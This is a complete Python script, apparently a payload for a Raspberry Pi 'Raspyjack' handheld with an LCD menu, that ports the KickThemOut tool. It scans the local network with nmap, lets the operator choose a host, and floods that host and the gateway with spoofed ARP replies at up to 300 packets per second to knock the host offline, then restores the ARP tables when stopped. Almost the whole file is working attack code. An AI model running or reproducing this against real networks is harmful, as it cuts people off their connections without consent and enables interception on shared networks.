#!/usr/bin/env python3
# Raspyjack Payload: KickThemOut

# --- IMPORTS ---
import sys
import os
import time
import signal
import threading
import logging
from PIL import Image, ImageDraw, ImageFont

# Add Raspyjack root to path
RASPYJACK_ROOT = '/root/Raspyjack'
if os.path.isdir(RASPYJACK_ROOT) and RASPYJACK_ROOT not in sys.path:
    sys.path.insert(0, RASPYJACK_ROOT)

# --- HARDWARE & PAYLOAD-SPECIFIC IMPORTS ---
try:
    # Raspyjack hardware libs
    import LCD_Config
    import LCD_1in44
    import RPi.GPIO as GPIO

    # KickThemOut dependencies
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
    from scapy.config import conf
    conf.ipv6_enabled = False
    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, get_if_list
    import nmap
    import netifaces
except ImportError as e:
    # If imports fail, we can't run. Log this for debugging.
    with open("/tmp/kickthemout_payload.log", "a") as f:
        f.write(f"Failed to import libraries: {e}\n")
        f.write("Please ensure scapy, python-nmap, and netifaces are installed (`pip3 install scapy python-nmap netifaces`).\n")
    sys.exit(1)


# --- LOGGING SETUP ---
LOG_FILE = "/tmp/kickthemout_payload.log"
open(LOG_FILE, "w").close() # Clear log on start
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

def log(message):
    logging.info(message)

# --- GLOBAL STATE & CONFIG ---
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "KEY_PRESS": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
RUNNING = True
DEBOUNCE_DELAY = 0.25
PACKETS_PER_SECOND = 1 # Default value

# --- UI Drawing Helpers ---
LCD = None
font = None
small_font = None

def setup_display():
    global LCD, font, small_font
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    LCD.LCD_Clear()
    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
        small_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 11)
    except IOError:
        font = ImageFont.load_default()
        small_font = ImageFont.load_default()

def draw_text(draw, text, position, in_font, fill="WHITE"):
    draw.text(position, text, font=in_font, fill=fill)

def draw_centered_text(draw, text, y, in_font, fill="WHITE"):
    bbox = draw.textbbox((0, 0), text, font=in_font)
    text_width = bbox[2] - bbox[0]
    x = (128 - text_width) // 2
    draw.text((x, y), text, font=in_font, fill=fill)

def display_message(message_lines):
    if not LCD: return
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    y = 40
    for line in message_lines:
        draw_centered_text(draw, line, y, font, "LIME")
        y += 20
    LCD.LCD_ShowImage(image, 0, 0)

def draw_menu(draw, title, items, selected_index):
    draw.rectangle([(0, 0), (128, 128)], fill="BLACK")
    draw_centered_text(draw, title, 5, font, "CYAN")
    draw.line([(10, 25), (118, 25)], fill="CYAN", width=1)

    max_items_on_screen = 7
    start_index = max(0, selected_index - (max_items_on_screen // 2))

    y = 30
    for i in range(start_index, min(len(items), start_index + max_items_on_screen)):
        item_ip = items[i].get('ip', 'N/A')
        item_mac = items[i].get('mac', 'N/A')
        
        display_text = f"{item_ip}"
        
        if i == selected_index:
            draw.rectangle([(0, y - 2), (128, y + 15)], fill="BLUE")
            draw_text(draw, display_text, (5, y), font, "YELLOW")
        else:
            draw_text(draw, display_text, (5, y), font, "WHITE")
        y += 18

def draw_confirm_screen(draw, target_ip, pps):
    draw.rectangle([(0, 0), (128, 128)], fill="BLACK")
    draw_centered_text(draw, "Confirm Attack", 5, font, "ORANGE")
    draw.line([(10, 25), (118, 25)], fill="ORANGE", width=1)
    
    draw_text(draw, "Target:", (10, 35), font, "WHITE")
    draw_text(draw, target_ip, (10, 55), font, "YELLOW")

    draw_text(draw, "Packets/sec:", (10, 80), font, "WHITE")
    draw_text(draw, str(pps), (100, 80), font, "YELLOW")
    
    draw_centered_text(draw, "OK to start", 115, small_font, "LIME")


# --- KICKTHEMOUT LOGIC ---

class AttackThread(threading.Thread):
    def __init__(self, my_mac, gateway_ip, target_ip, target_mac, packets_per_second):
        super(AttackThread, self).__init__()
        self.my_mac = my_mac
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.packets_per_second = packets_per_second
        self.stop_event = threading.Event()
        self.daemon = True

    def run(self):
        log(f"Starting attack on {self.target_ip} at {self.packets_per_second} pps")
        sleep_duration = 1.0 / self.packets_per_second
        while not self.stop_event.is_set():
            self.send_spoof_packet(self.gateway_ip, self.target_ip, self.target_mac)
            self.send_spoof_packet(self.target_ip, self.gateway_ip, get_mac(self.gateway_ip))
            time.sleep(sleep_duration)
        log(f"Attack on {self.target_ip} stopped.")
        # Restore ARP tables
        log("Restoring ARP for target and gateway.")
        gateway_mac = get_mac(self.gateway_ip)
        if not gateway_mac:
            log("Could not get gateway MAC for ARP restoration.")
            return
        for _ in range(5):
            self.send_restore_packet(self.gateway_ip, self.target_ip, gateway_mac, self.target_mac)
            self.send_restore_packet(self.target_ip, self.gateway_ip, self.target_mac, gateway_mac)
            time.sleep(0.5)

    def send_spoof_packet(self, src_ip, dest_ip, dest_mac):
        if not dest_mac: return
        arp = ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=dest_mac)
        ether = Ether(src=self.my_mac, dst=dest_mac)
        packet = ether / arp
        sendp(packet, verbose=False)

    def send_restore_packet(self, src_ip, dest_ip, src_mac, dest_mac):
        if not src_mac or not dest_mac: return
        arp = ARP(op=2, psrc=src_ip, pdst=dest_ip, hwsrc=src_mac, hwdst=dest_mac)
        ether = Ether(src=src_mac, dst=dest_mac)
        packet = ether / arp
        sendp(packet, verbose=False)

    def stop(self):
        self.stop_event.set()

def get_mac(ip):
    try:
        query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(query, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception as e:
        log(f"Could not get MAC for {ip}: {e}")
        return None

def get_network_info():
    try:
        gws = netifaces.gateways()
        default_gw = gws.get('default', {}).get(netifaces.AF_INET)
        if not default_gw:
            log("Could not find default gateway.")
            return None, None, None, None
        
        gateway_ip = default_gw[0]
        interface = default_gw[1]
        my_mac = get_if_hwaddr(interface)
        
        addrs = netifaces.ifaddresses(interface)
        my_ip = addrs[netifaces.AF_INET][0]['addr']
        netmask = addrs[netifaces.AF_INET][0]['netmask']

        # Calculate CIDR
        cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        network_range = f"{my_ip}/{cidr}"

        log(f"Gateway: {gateway_ip}, Interface: {interface}, MAC: {my_mac}, Network: {network_range}")
        return gateway_ip, my_mac, network_range, my_ip
    except Exception as e:
        log(f"Error getting network info: {e}")
        return None, None, None, None

def scan_network(network_range):
    log(f"Scanning network: {network_range}")
    display_message(["Scanning...", network_range])
    
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=network_range, arguments='-sn')
    except nmap.PortScannerError:
        log("Nmap not found. Please install it.")
        return []

    hosts = []
    for host_ip in nm.all_hosts():
        if 'mac' in nm[host_ip]['addresses']:
            host_mac = nm[host_ip]['addresses']['mac']
            hosts.append({'ip': host_ip, 'mac': host_mac})
    log(f"Scan found {len(hosts)} hosts.")
    return hosts

# --- MAIN SCRIPT ---

def cleanup(*_):
    global RUNNING
    if not RUNNING: return
    RUNNING = False
    log("Cleanup called. Exiting.")
    if LCD:
        image = Image.new("RGB", (128, 128), "BLACK")
        draw = ImageDraw.Draw(image)
        draw_centered_text(draw, "Exiting...", 55, font, "WHITE")
        LCD.LCD_ShowImage(image, 0, 0)
        time.sleep(0.5)
        LCD.LCD_Clear()
    GPIO.cleanup()
    log("GPIO cleaned up.")

def main():
    global RUNNING, PACKETS_PER_SECOND
    
    state = 'init' # init, scanning, menu, confirm_attack, attacking
    last_press_time = 0
    online_hosts = []
    selected_index = 0
    attack_thread = None
    gateway_ip, my_mac, network_range, my_ip = None, None, None, None

    while RUNNING:
        current_time = time.time()
        
        if state == 'init':
            display_message(["KickThemOut", "Initializing..."])
            gateway_ip, my_mac, network_range, my_ip = get_network_info()
            if not all([gateway_ip, my_mac, network_range]):
                display_message(["Network Error", "Check logs."])
                time.sleep(5)
                RUNNING = False
                continue
            state = 'scanning'

        elif state == 'scanning':
            hosts = scan_network(network_range)
            online_hosts = [h for h in hosts if h['ip'] != my_ip and h['ip'] != gateway_ip]
            if not online_hosts:
                display_message(["No Targets", "Found."])
                time.sleep(3)
                state = 'scanning'
            else:
                selected_index = 0
                state = 'menu'

        elif state == 'menu':
            image = Image.new("RGB", (128, 128), "BLACK")
            draw = ImageDraw.Draw(image)
            draw_menu(draw, "Select Target", online_hosts, selected_index)
            LCD.LCD_ShowImage(image, 0, 0)

            if (current_time - last_press_time) > DEBOUNCE_DELAY:
                if GPIO.input(PINS["UP"]) == 0:
                    last_press_time = current_time
                    selected_index = (selected_index - 1) % len(online_hosts)
                elif GPIO.input(PINS["DOWN"]) == 0:
                    last_press_time = current_time
                    selected_index = (selected_index + 1) % len(online_hosts)
                elif GPIO.input(PINS["KEY_PRESS"]) == 0:
                    last_press_time = current_time
                    state = 'confirm_attack'
                elif GPIO.input(PINS["LEFT"]) == 0:
                    last_press_time = current_time
                    state = 'scanning'

        elif state == 'confirm_attack':
            target_ip = online_hosts[selected_index]['ip']
            image = Image.new("RGB", (128, 128), "BLACK")
            draw = ImageDraw.Draw(image)
            draw_confirm_screen(draw, target_ip, PACKETS_PER_SECOND)
            LCD.LCD_ShowImage(image, 0, 0)

            if (current_time - last_press_time) > DEBOUNCE_DELAY:
                if GPIO.input(PINS["UP"]) == 0:
                    last_press_time = current_time
                    PACKETS_PER_SECOND = min(300, PACKETS_PER_SECOND + 1)
                elif GPIO.input(PINS["DOWN"]) == 0:
                    last_press_time = current_time
                    PACKETS_PER_SECOND = max(1, PACKETS_PER_SECOND - 1)
                elif GPIO.input(PINS["LEFT"]) == 0:
                    last_press_time = current_time
                    state = 'menu'
                elif GPIO.input(PINS["KEY_PRESS"]) == 0:
                    last_press_time = current_time
                    target = online_hosts[selected_index]
                    attack_thread = AttackThread(my_mac, gateway_ip, target['ip'], target['mac'], PACKETS_PER_SECOND)
                    attack_thread.start()
                    state = 'attacking'

        elif state == 'attacking':
            target_ip = attack_thread.target_ip
            image = Image.new("RGB", (128, 128), "BLACK")
            draw = ImageDraw.Draw(image)
            draw_centered_text(draw, "ATTACKING", 20, font, "RED")
            draw_centered_text(draw, target_ip, 50, font, "WHITE")
            draw_centered_text(draw, f"{attack_thread.packets_per_second} pps", 70, small_font, "WHITE")
            draw_centered_text(draw, "Press LEFT to stop", 100, small_font, "YELLOW")
            LCD.LCD_ShowImage(image, 0, 0)

            if (current_time - last_press_time) > DEBOUNCE_DELAY:
                if GPIO.input(PINS["LEFT"]) == 0:
                    last_press_time = current_time
                    log("Stop button pressed.")
                    attack_thread.stop()
                    attack_thread.join()
                    attack_thread = None
                    state = 'menu'

        if GPIO.input(PINS["KEY3"]) == 0:
            RUNNING = False
            if attack_thread:
                attack_thread.stop()
                attack_thread.join()

        time.sleep(0.1)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    try:
        log("Payload started.")
        
        GPIO.setmode(GPIO.BCM)
        for pin in PINS.values():
            GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
        
        setup_display()
        
        main()

    except Exception as e:
        log(f"An unhandled exception occurred: {e}")
        import traceback
        with open(LOG_FILE, "a") as f:
            traceback.print_exc(file=f)
    finally:
        cleanup()
